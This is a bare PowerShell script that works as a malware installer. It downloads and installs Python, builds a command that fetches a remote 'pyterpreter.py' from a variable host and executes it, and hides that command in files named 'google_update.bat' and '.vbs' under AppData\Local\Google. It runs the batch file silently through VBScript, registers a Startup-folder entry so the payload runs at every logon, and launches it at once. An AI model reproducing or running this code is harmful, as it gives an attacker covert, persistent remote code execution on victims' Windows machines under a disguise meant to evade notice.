Invoke-webrequest -URI $URL/python.msix -outfile $HOME\python.msix
add-appxpackage -path $HOME\python.msix
python3.8 -m pip install requests
$python_command = "`"import requests; r=requests.get('$URL/pyterpreter.py'); exec(r.text)`""

mkdir "$HOME\AppData\Local\Google"
New-Item -Path $HOME\AppData\Local\Google -name google_update.bat -ItemType "File" -Value "python3.8 -c $python_command"
New-Item -Path $HOME\Appdata\Local\Google -name google_update.vbs -ItemType "File"
Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -value 'Set WshShell = CreateObject("WScript.Shell" )'
Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -Value 'WshShell.run """" & "C:\users\pyro\AppData\Local\Google\google_update.bat" & """", 0, False'
Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -Value 'Set WshShell = Nothing'
$vbs_path = "$HOME\AppData\Local\Google\google_update.vbs"
New-Item -Path "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name startup.cmd -Value "cscript $vbs_path"
cscript.exe $vbs_path
